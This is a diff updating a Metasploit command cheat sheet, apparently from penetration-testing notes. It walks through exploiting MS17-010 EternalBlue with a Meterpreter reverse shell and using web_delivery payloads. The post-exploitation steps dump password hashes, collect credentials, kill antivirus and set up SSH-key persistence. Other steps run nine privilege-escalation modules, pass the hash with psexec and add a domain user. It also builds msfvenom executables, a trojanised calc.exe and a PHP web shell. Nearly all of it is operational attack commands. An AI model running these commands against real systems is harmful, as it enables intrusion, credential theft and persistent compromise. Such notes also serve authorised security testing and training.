@@ -21,16 +21,17 @@ msf > db_rebuild_cache
 [*] Purging and rebuilding the module cache in the background...
 
 Wait about 3 min.
-msf > search ms16             Show all Microsoft exploits released in 2016.
+msf > search ms17                             Show all Microsoft exploits released in 2017.
 ------------------------------------------------------------------------------------------------------
 
-service postgrsql start       Start the PostreSQL db.
-msfconsole                    Start Metasploit.
-msf > db_status               Check that you are connected to the db.
+service postgrsql start                       Start the PostreSQL db.
+msfconsole                                    Start Metasploit.
+msf > db_status                               Check that you are connected to the db.
 ------------------------------------------------------------------------------------------------------
+
+# Troubleshooting
 
 # If the db connection fails:
-
 msf > exit
 msfdb init
 msfconsole
@@ -58,34 +59,43 @@ service postgresql restart
 msfdb init
 msfconsole
 msf > db_status
-------------------------------------------------------------------------------------------------------
 
 # Module database cache not built yet, using slow search
-db_rebuild_cache              Rebuilds the database-stored module cache
+db_rebuild_cache                              Rebuilds the database-stored module cache
 ------------------------------------------------------------------------------------------------------
 
-help or ?                     Show available commands and their descriptions.
-show -h                       Show help on the 'show' command.
+help or ?                                     Show available commands and their descriptions.
+grep -h                                       Show help on the 'grep' command.
+------------------------------------------------------------------------------------------------------
+
+# Searching
+
+search <string>
+search ms17                                   Show all Microsoft exploits released in 2017.
+
+grep <string> search <type>
+grep php search payloads                      Search all payloads, then grep for php.
 ------------------------------------------------------------------------------------------------------
 
 # Basic usage
 
-show <all, auxilary, encoders, exploits, nops, payloads, plugins>
-search <string>
-search ms08                   Show all Microsoft exploits released in 2008.
-grep php show payloads        Show all payloads using php.
+show <all, auxilary, encoders, exploits, nops, payloads, plugins, post>
+show exploits
+search ms17_010
 
-use exploit/windows/smb/ms08_067_netapi
+use exploit/windows/smb/ms17_010_eternalblue
 show info
-show targets                  Show OSs that can be targeted with this exploit.
-set target 0
-show payloads                 Show all payloads that work with this exploit.
-set payload windows/meterpreter/reverse_tcp
-show options                  Show remainging options for the payload.
-show advanced
-set lhost <attacker IP>       Set the listner to the attacker's IP.
-set lport 443                 Set the listening port to 443.
-exploit                       Run the exploit.
+set rhost <target IP>
+show targets                                  Show OSs that can be targeted with this exploit.
+show payloads                                 Show all payloads that work with this exploit.
+set payload windows/x64/meterpreter/reverse_tcp
+show options                                  Show remainging options for the payload.
+set lhost <attacker IP>                       Set the listner to the attacker's IP.
+set lport <attacker port>                     Set the listening port to 443.
+exploit                                       Run the exploit.
+
+- If the target is Linux: set AutoRunscript post/linux/manage/sshkey_persistence
+This lets you automatically establish persistence, without having to think about it.
 ------------------------------------------------------------------------------------------------------
 
 # Cross platform exploit
@@ -93,18 +103,18 @@ exploit                       Run the exploit.
 - Windows
 use exploit/multi/script/web_delivery
 set lhost <attacker IP>
-set lport 443
+set lport <attacker port>
 show targets
-set target 2                  Set the target language to Powershell.
+set target 2                                  Set the target language to Powershell.
 set payload windows/meterpreter/reverse_tcp
 exploit
 
 - Linux and OS X
 use exploit/multi/script/web_delivery
-set LHOST <attacker IP>
-set LPORT 443
-set TARGET 0                  Set the target language to Python.
-set PAYLOAD python/meterpreter/reverse_tcp
+set lhost <attacker IP>
+set lport <attacker port>
+set target 0                                  Set the target language to Python.
+set payload python/meterpreter/reverse_tcp
 exploit
 ------------------------------------------------------------------------------------------------------
 
@@ -143,45 +153,99 @@ sessions -i 2                                 Interact with session 2.
 ctrl z                                        Put the session in the background and go back to the MSF.
 ------------------------------------------------------------------------------------------------------
 
-# Post exploitation - establish awareness
+# Post exploitation - situational awareness
 
-migrate                                       Migrate the server to another process.
+ps                                            Search for a process running as NT AUTHORITY\SYSTEM.
+migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM.
 sysinfo                                       Gets information about the remote system, such as OS.
 getuid                                        Get the user that the server is running as.
 ipconfig                                      Show the target IP.
-run post/windows/gather/checkvm               Check to see if the target is a VM.
+
 run get_local_subnets                         Get the local subnets.
+run post/windows/gather/hashdump
+run post/windows/gather/credentials/credential_collector
+
+run killav
+run getcountermeasure
+run winenum
+run post/windows/gather/checkvm
+run post/windows/gather/enum_applications
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/enum_shares
+run post/windows/gather/enum_snmp
+run post/windows/gather/usb_history
+reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
 ------------------------------------------------------------------------------------------------------
 
-# Escalate Privileges
+# Escalate privileges
 
 use priv                                      Attempt to elevate to NT AUTHORITY\SYSTEM.
 background                                    If this fails, background the current session and try options. 
 
-Option 1:
+--Option 1:
 getsystem
 
-Option 2:
-use exploit/windows/local/bypassuac_vbs
-set session <#>                               
+--Option 2:
+use exploit/windows/local/bypassuac
+set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
-set LPORT 4444                                This MUST be a different port from what was used in the original exploit.
+set LPORT 444                                 This MUST be a different port from what was used in the original exploit.
 exploit
 
-Option 3:
-use post/windows/escalate/getsystem
+--Option 3:
+run post/windows/escalate/getsystem
 getuid
 getsystem
 getuid                                        Privileges should now be NT AUTHORITY\SYSTEM.
 
-Other options:
+--Option 4:
 use post/windows/escalate/droplnk
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+set LPORT 444
+exploit
+
+--Option 5:
 use exploit/windows/local/service_permissions
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+set LPORT 444
+exploit
+
+--Option 6:
 use exploit/windows/local/trusted_service_path
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+set LPORT 444
+exploit
+
+--Option 7:
 use exploit/windows/local/ppr_flatten_rec
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+set LPORT 444
+exploit
+
+--Option 8:
 use exploit/windows/local/ms_ndproxy
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+set LPORT 444
+exploit
+
+--Option 9:
 use exploit/windows/local/ask
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+set LPORT 444
+exploit
 ------------------------------------------------------------------------------------------------------
 
 # Dump hashes
@@ -286,11 +350,11 @@ upload /usr/share/windows-binaries/nc.exe c:\\
 
 use windows/smb/psexec
 set SMBUser <user name>
-set SMBPass <user name hash from another target>
+set SMBPass <user hash>
 set RHOST <target IP>
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
-set LPORT 443
+set LPORT <attacker port>
 exploit
 ------------------------------------------------------------------------------------------------------
 
@@ -310,7 +374,7 @@ run arp_scanner -r 10.10.10.1/24
 10.0.0.20
 
 meterpreter > background
-route add 10.0.0.1 255.255.255.0 x            Where x is the meterpreter session ID.
+route add 10.0.0.1/24 x                       Where x is the meterpreter session ID.
 route print                                   Verify the new route.
 
 use auxiliary/scanner/portscan/tcp
@@ -318,13 +382,6 @@ set RHOSTS 10.0.0.0/24
 set PORTS 445
 set THREADS 10
 run
-
-# Pivoting with Cobalt Strike
-
-ssh -D 1080 user@targetIP
-Open a new tab:
-     setg Proxies socks4:127.0.0.1:1080
-     setg ReverseAllowProxy true
 ------------------------------------------------------------------------------------------------------
 
 Post exploitation of a domain controller (DC)
@@ -335,7 +392,12 @@ msf post(enum_ad_computers) > set filter objectCategory=computer
 msf post(enum_ad_computers) > set session 1
 msf post(enum_ad_computers) > exploit
 
-Gather all Groups in Active Directory
+# Enumerate all logged on users
+msf > use post/windows/gather/enum_logged_on_users
+msf post(enum_logged_on_users) > set session 1
+msf post(enum_logged_on_users) > exploit
+
+# Gather all Groups in Active Directory
 msf > use post/windows/gather/enum_ad_groups
 msf post(enum_ad_groups) > set session 1
 msf post(enum_ad_groups) > exploit
@@ -345,7 +407,7 @@ msf > post/windows/gather/enum_shares
 msf post(enum_shares) > set session 1
 msf post(enum_shares) > exploit
 
-#  Add any user in Active Directory
+# Add any user in Active Directory
 msf > use post/windows/manage/add_user_domain
 msf post(add_user_domain) > set addtodomain true
 msf post(add_user_domain) > set username hacker
@@ -358,19 +420,14 @@ msf > use post/windows/manage/delete_user
 msf post(delete_user) > set username hacker
 msf post(delete_user) > set session 1
 msf post(delete_user) > exploit
-
-# Enumerate all logged on users
-msf > use post/windows/gather/enum_logged_on_users
-msf post(enum_logged_on_users) > set session 1
-msf post(enum_logged_on_users) > exploit
 ------------------------------------------------------------------------------------------------------
 
 # msfvenom
 
 msfvenom -p <payload variable=value> -f <format> -a <arch> --platform <OS platform> -o <output file>
 
-Generate a reverse payload and save as an executable:
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.7 LPORT=443 -f exe -a x86_64 —platform windows -o /root/payload64.exe
+Generate a reverse payload and save it as an executable:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.7 LPORT=443 -f exe -a x86_64 —platform windows -o /root/evil64.exe
 
 Generate a bind payload that avoids a bad character:
 msfvenom -p windows/meterpreter/bind_tcp -b '\x00'
@@ -380,7 +437,6 @@ msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
 
 Inject a bind payload into calc.exe and save it as an executable: 
 msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
-------------------------------------------------
 
 Generate PHP web shell
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -a php -e php/base64 -f raw -o webshell.php
@@ -394,32 +450,10 @@ set LPORT 443
 exploit
 
 Access the shell on the remote web server.
-firefox http://<tartget URL>/webshell.php
+firefox http://<tartget IP>/webshell.php
 ------------------------------------------------------------------------------------------------------
 
 # Database
-
-msf > help database
-
-Database Backend Commands
-=========================
-
-    Command                   Description
-    -------                   -----------
-    creds                     List all credentials in the database
-    db_connect                Connect to an existing database
-    db_disconnect             Disconnect from the current database instance
-    db_export                 Export a file containing the contents of the database
-    db_import                 Import a scan result file (filetype will be auto-detected)
-    db_nmap                   Executes nmap and records the output automatically
-    db_rebuild_cache          Rebuilds the database-stored module cache
-    db_status                 Show the current database status
-    hosts                     List all hosts in the database
-    loot                      List all loot in the database
-    notes                     List all notes in the database
-    services                  List all services in the database
-    vulns                     List all vulnerabilities in the database
-    workspace                 Switch between database workspaces
 
 services -p 22                List specific ports.
 services -s http              List specific services.
